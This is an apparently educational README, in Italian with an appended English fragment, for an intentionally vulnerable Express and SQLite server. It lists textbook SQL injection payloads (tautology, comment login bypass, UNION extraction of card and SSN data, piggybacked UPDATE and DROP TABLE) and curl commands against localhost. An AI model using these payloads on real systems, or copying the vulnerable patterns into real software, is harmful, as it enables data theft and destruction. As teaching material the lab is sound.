# 🔓 SQL Injection Vulnerability Demonstration

## ⚠️ **ATTENZIONE - DISCLAIMER IMPORTANTE**
Questo progetto contiene **vulnerabilità intenzionali** per scopi **educativi e di ricerca** in cybersecurity.
**NON utilizzare questo codice in ambiente di produzione!**

## 🎯 Obiettivi del Progetto

Implementazione di un server web vulnerabile che dimostra attacchi di **SQL Injection inband** utilizzando:
- ✅ **Tautologia** 
- ✅ **Commenti di fine riga**
- ✅ **Piggybacked queries**  
- ✅ **Union-based injection**

### 🛡️ Violazione Proprietà CIA
Il progetto dimostra come gli attacchi SQL injection possano compromettere:
- **🔒 Confidentiality**: Esfiltrazione dati sensibili (carte credito, SSN)
- **✏️ Integrity**: Modifica non autorizzata dati (escalation privilegi)
- **🔌 Availability**: Eliminazione tabelle critiche del database

## 🚀 Quick Start

### Installazione
```bash
npm install
```

### Avvio Server
```bash
npm start
```

### Accesso
Apri http://localhost:3000 nel browser per la dashboard con esempi di attacchi pronti all'uso.

## 🗃️ Database SQLite

Il server utilizza un database **SQLite reale** (`database.db`) con tabelle popolate con dati di test:

### 📊 Struttura Database
- **`users`**: Utenti con credenziali e ruoli
- **`products`**: Catalogo prodotti per e-commerce
- **`orders`**: Ordini degli utenti
- **`sensitive_data`**: Dati sensibili (carte credito, SSN, note segrete)

### 👥 Utenti di Test
- **admin** / admin123 (role: admin)
- **john_doe** / password123 (role: user)  
- **jane_smith** / secret456 (role: user)
- **bob_wilson** / mypass789 (role: user)
- **alice_brown** / qwerty (role: user)

## 🔴 Endpoint Vulnerabili

### 1. `GET /users?id=X` - Tautologia
```bash
# Bypass WHERE clause
/users?id=1 OR 1=1

# Database reconnaissance  
/users?id=1 UNION SELECT name,sql,1,1,1,1 FROM sqlite_master WHERE type='table'
```

### 2. `POST /login` - Commenti Fine Riga
```bash
# Authentication bypass
username: admin'--
password: anything
```

### 3. `GET /search?query=X` - Union-based
```bash
# Data exfiltration
/search?query=' UNION SELECT credit_card,ssn,secret_notes,1,1 FROM sensitive_data--
```

### 4. `POST /update-profile` - Piggybacked 
```bash
# Privilege escalation
bio: fake'; UPDATE users SET role='admin' WHERE username='john_doe'; --

# Table destruction
bio: fake'; DROP TABLE products; --
```

## 🧪 Testing degli Attacchi

### Browser (GUI)
1. Apri http://localhost:3000
2. Usa i form precompilati con payload di esempio
3. Osserva i risultati e le query eseguite

### Command Line (CLI)
```bash
# Tautologia
curl "http://localhost:3000/users?id=1%20OR%201=1"

# Authentication bypass
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'--&password=fake"

# Data exfiltration  
curl "http://localhost:3000/search?query='%20UNION%20SELECT%20credit_card,ssn,secret_notes,1,1%20FROM%20sensitive_data--"
```

## 🔍 Utilities

### Verifica Stato Database
```bash
GET /dump  # Visualizza tutti i dati
GET /info  # Struttura database
```

### Reset Database  
```bash
POST /reset-db  # Ripristina stato originale
```

### Dimostrazione CIA
```bash
GET /demonstrate-cia  # Esempi violazione proprietà CIA
```

## 📁 File del Progetto

```
├── server.js          # Server Express con vulnerabilità SQL injection
├── package.json       # Dipendenze Node.js  
├── database.db        # Database SQLite (generato automaticamente)
├── README.md          # Questa documentazione
└── ATTACKS.md         # Guida dettagliata agli attacchi
```

## 🧠 Tecnologie Utilizzate

- **Node.js** - Runtime JavaScript
- **Express.js** - Web framework
- **SQLite3** - Database relazionale 
- **HTML/CSS** - Frontend per testing

## 📚 Scopo Educativo

Questo progetto è stato sviluppato per:
- 🎓 **Formazione in cybersecurity**
- 🔍 **Comprensione delle vulnerabilità SQL injection**  
- 🛡️ **Sensibilizzazione sui rischi di sicurezza**
- 🧪 **Testing e ricerca in sicurezza applicativa**

## ⚠️ Responsabilità

L'uso di questo codice è **esclusivamente** per:
- Apprendimento e ricerca accademica
- Testing su sistemi di proprietà  
- Formazione in cybersecurity

**È vietato utilizzare questo codice per:**
- Attacchi a sistemi non autorizzati
- Scopi malevoli o illegali
- Ambiente di produzione

## 🤝 Contributi

Per miglioramenti o correzioni:
1. Fork del progetto
2. Creazione branch feature  
3. Commit delle modifiche
4. Pull request

---

**⚠️ Ricorda: La sicurezza è responsabilità di tutti. Usa queste conoscenze per proteggere, non per danneggiare.**
   ```bash
   cd SQLInjection
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Start the server:
   ```bash
   npm start
   ```

4. Open your browser and go to `http://localhost:3000`

## Available Endpoints

- **GET /** - Main page with information and login form
- **GET /users** - Vulnerable endpoint that demonstrates SQL injection in query parameters
  - Try: `http://localhost:3000/users?id=1 OR 1=1`
- **POST /login** - Vulnerable login endpoint
  - Try username: `admin' OR 1=1 --`

## Educational Purpose

This server is designed to help students understand:
- How SQL injection vulnerabilities occur
- The importance of input validation and parameterized queries
- Common attack patterns and payloads

## Security Note

In a real application, you should:
- Use parameterized queries/prepared statements
- Validate and sanitize all user input
- Use an ORM with built-in SQL injection protection
- Implement proper authentication and authorization